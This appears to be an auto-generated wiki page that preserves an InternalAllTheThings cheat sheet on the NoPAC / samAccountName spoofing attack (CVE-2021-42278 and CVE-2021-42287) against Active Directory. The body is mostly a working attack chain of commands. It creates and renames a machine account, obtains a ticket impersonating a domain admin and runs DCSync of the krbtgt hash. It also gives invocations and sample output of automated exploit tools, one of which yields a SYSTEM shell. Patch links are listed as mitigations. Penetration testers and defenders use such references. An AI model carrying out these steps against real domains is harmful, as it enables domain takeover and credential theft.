---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# NoPAC / samAccountName Spoofing

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-cve-nopac` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/CVE/NoPAC.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [NoPAC / samAccountName Spoofing](../../topics/active-directory/nopac-samaccountname-spoofing.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-cve-nopac |
| name | NoPAC / samAccountName Spoofing |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/CVE/NoPAC.md |

## Preserved Source Material

````yaml
_body: "# NoPAC / samAccountName Spoofing\n\nDuring S4U2Self, the KDC will try to append a '\\$' to the computer name specified\
  \ in the TGT, if the computer name is not found.\n\nAn attacker can create a new machine account with the sAMAccountName\
  \ set to a domain controller's sAMAccountName - without the '\\$'.\n\nFor instance, suppose there is a domain controller\
  \ with a sAMAccountName set to 'DC\\$'.\nAn attacker would then create a machine account with the sAMAccountName set to\
  \ 'DC'.\n\nThe attacker can then request a TGT for the newly created machine account.\n\nAfter the TGT has been issued by\
  \ the KDC, the attacker can rename the newly created machine account to something different, e.g. JOHNS-PC.\n\nThe attacker\
  \ can then perform S4U2Self and request a ST to itself as any user.\n\nSince the machine account with the sAMAccountName\
  \ set to 'DC' has been renamed, the KDC will try to find the machine account by appending a '$', which will then match the\
  \ domain controller. The KDC will then issue a valid ST for the domain controller.\n\n**Requirements**:\n\n* MachineAccountQuota\
  \ > 0\n\n**Check for exploitation**:\n\n* Check the MachineAccountQuota of the account\n\n  ```powershell\n  netexec ldap\
  \ 10.10.10.10 -u username -p 'Password123' -d 'domain.local' --kdcHost 10.10.10.10 -M MAQ\n  StandIn.exe --object ms-DS-MachineAccountQuota=*\n\
  \  ```\n\n* Check if the DC is vulnerable\n\n  ```powershell\n  netexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac\n\
  \  ```\n\n**Exploitation**:\n\n1. Create a computer account\n\n    ```powershell\n    impacket@linux> addcomputer.py -computer-name\
  \ 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'\n\
  \n    powermad@windows> . .\\Powermad.ps1\n    powermad@windows> $password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText\
  \ -Force\n    powermad@windows> New-MachineAccount -MachineAccount \"ControlledComputer\" -Password $($password) -Domain\
  \ \"domain.local\" -DomainController \"DomainController.domain.local\" -Verbose\n\n    sharpmad@windows> Sharpmad.exe MAQ\
  \ -Action new -MachineAccount ControlledComputer -MachinePassword ComputerPassword\n    ```\n\n2. Clear the controlled machine\
  \ account `servicePrincipalName` attribute\n\n    ```ps1\n    krbrelayx@linux> addspn.py -u 'domain\\user' -p 'password'\
  \ -t 'ControlledComputer$' -c DomainController\n\n    powershell@windows> . .\\Powerview.ps1\n    powershell@windows> Set-DomainObject\
  \ \"CN=ControlledComputer,CN=Computers,DC=domain,DC=local\" -Clear 'serviceprincipalname' -Verbose\n    ```\n\n3. (CVE-2021-42278)\
  \ Change the controlled machine account `sAMAccountName` to a Domain Controller's name without the trailing `$`\n\n    ```ps1\n\
  \    # https://github.com/SecureAuthCorp/impacket/pull/1224\n    impacket@linux> renameMachine.py -current-name 'ControlledComputer$'\
  \ -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'\n\n    powermad@windows>\
  \ Set-MachineAccountAttribute -MachineAccount \"ControlledComputer\" -Value \"DomainController\" -Attribute samaccountname\
  \ -Verbose\n    ```\n\n4. Request a TGT for the controlled machine account\n\n    ```ps1\n    impacket@linux> getTGT.py\
  \ -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword'\n\n    cmd@windows> Rubeus.exe\
  \ asktgt /user:\"DomainController\" /password:\"ComputerPassword\" /domain:\"domain.local\" /dc:\"DomainController.domain.local\"\
  \ /nowrap\n    ```\n\n5. Reset the controlled machine account sAMAccountName to its old value\n\n    ```ps1\n    impacket@linux>\
  \ renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'\n\n\
  \    powermad@windows> Set-MachineAccountAttribute -MachineAccount \"ControlledComputer\" -Value \"ControlledComputer\"\
  \ -Attribute samaccountname -Verbose\n    ```\n\n6. (CVE-2021-42287) Request a service ticket with `S4U2self` by presenting\
  \ the TGT obtained before\n\n    ```ps1\n    # https://github.com/SecureAuthCorp/impacket/pull/1202\n    impacket@linux>\
  \ KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -spn 'cifs/DomainController.domain.local'\
  \ -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController'\n\n    cmd@windows> Rubeus.exe s4u\
  \ /self /impersonateuser:\"DomainAdmin\" /altservice:\"ldap/DomainController.domain.local\" /dc:\"DomainController.domain.local\"\
  \ /ptt /ticket:[Base64 TGT]\n    ```\n\n7. DCSync\n\n    ```ps1\n    KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user\
  \ 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'\n    ```\n\nAutomated exploitation:\n\
  \n* [cube0x0/noPac](https://github.com/cube0x0/noPac) - Windows\n\n    ```powershell\n    noPac.exe scan -domain htb.local\
  \ -user user -pass 'password123'\n    noPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc.htb.local\
  \ /mAccount demo123 /mPassword Password123! /service cifs /ptt\n    noPac.exe -domain htb.local -user domain_user -pass\
  \ \"Password123!\" /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service ldaps /ptt /impersonate Administrator\n\
  \    ```\n\n* [Ridter/noPac](https://github.com/Ridter/noPac) - Linux\n\n  ```ps1\n  python noPac.py 'domain.local/user'\
  \ -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' -dc-ip 10.10.10.10 -use-ldap -dump\n  ```\n\n* [WazeHell/sam-the-admin](https://github.com/WazeHell/sam-the-admin)\n\
  \n    ```ps1\n    $ python3 sam_the_admin.py \"domain/user:password\" -dc-ip 10.10.10.10 -shell\n    [*] Selected Target\
  \ dc.caltech.white                                              \n    [*] Total Domain Admins 11                       \
  \                                 \n    [*] will try to impersonat gaylene.dreddy                                      \
  \   \n    [*] Current ms-DS-MachineAccountQuota = 10                                        \n    [*] Adding Computer Account\
  \ \"SAMTHEADMIN-11$\"                                     \n    [*] MachineAccount \"SAMTHEADMIN-11$\" password = EhFMT%mzmACL\
  \                      \n    [*] Successfully added machine account SAMTHEADMIN-11$ with password EhFMT%mzmACL.\n    [*]\
  \ SAMTHEADMIN-11$ object = CN=SAMTHEADMIN-11,CN=Computers,DC=caltech,DC=white   \n    [*] SAMTHEADMIN-11$ sAMAccountName\
  \ == dc                                          \n    [*] Saving ticket in dc.ccache                                  \
  \                  \n    [*] Resting the machine account to SAMTHEADMIN-11$                                \n    [*] Restored\
  \ SAMTHEADMIN-11$ sAMAccountName to original value                     \n    [*] Using TGT from cache                  \
  \                                        \n    [*] Impersonating gaylene.dreddy                                        \
  \          \n    [*]     Requesting S4U2self                                                       \n    [*] Saving ticket\
  \ in gaylene.dreddy.ccache                                        \n    [!] Launching semi-interactive shell - Careful what\
  \ you execute                   \n    C:\\Windows\\system32>whoami                                                     \
  \   \n    nt authority\\system \n    ```\n\n* [ly4k/Pachine](https://github.com/ly4k/Pachine)\n\n    ```powershell\n   \
  \ usage: pachine.py [-h] [-scan] [-spn SPN] [-impersonate IMPERSONATE] [-domain-netbios NETBIOSNAME] [-computer-name NEW-COMPUTER-NAME$]\
  \ [-computer-pass password] [-debug] [-method {SAMR,LDAPS}] [-port {139,445,636}] [-baseDN DC=test,DC=local]\n         \
  \         [-computer-group CN=Computers,DC=test,DC=local] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] -dc-host\
  \ hostname [-dc-ip ip]\n                  [domain/]username[:password]\n    $ python3 pachine.py -dc-host dc.domain.local\
  \ -scan 'domain.local/john:Passw0rd!'\n    $ python3 pachine.py -dc-host dc.domain.local -spn cifs/dc.domain.local -impersonate\
  \ administrator 'domain.local/john:Passw0rd!'\n    $ export KRB5CCNAME=$PWD/administrator@domain.local.ccache\n    $ impacket-psexec\
  \ -k -no-pass 'domain.local/administrator@dc.domain.local'\n    ```\n\n**Mitigations**:\n\n* [KB5007247 - Windows Server\
  \ 2012 R2](https://support.microsoft.com/en-us/topic/november-9-2021-kb5007247-monthly-rollup-2c3b6017-82f4-4102-b1e2-36f366bf3520)\n\
  * [KB5008601 - Windows Server 2016](https://support.microsoft.com/en-us/topic/november-14-2021-kb5008601-os-build-14393-4771-out-of-band-c8cd33ce-3d40-4853-bee4-a7cc943582b9)\n\
  * [KB5008602 - Windows Server 2019](https://support.microsoft.com/en-us/topic/november-14-2021-kb5008602-os-build-17763-2305-out-of-band-8583a8a3-ebed-4829-b285-356fb5aaacd7)\n\
  * [KB5007205 - Windows Server 2022](https://support.microsoft.com/en-us/topic/november-9-2021-kb5007205-os-build-20348-350-af102e6f-cc7c-4cd4-8dc2-8b08d73d2b31)\n\
  * [KB5008102](https://support.microsoft.com/en-us/topic/kb5008102-active-directory-security-accounts-manager-hardening-changes-cve-2021-42278-5975b463-4c95-45e1-831a-d120004e258e)\n\
  * [KB5008380](https://support.microsoft.com/en-us/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041)\n\
  \n## References\n\n* [sAMAccountName spoofing - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing)"
_relative_path: active-directory/CVE/NoPAC.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/CVE/NoPAC.md
````
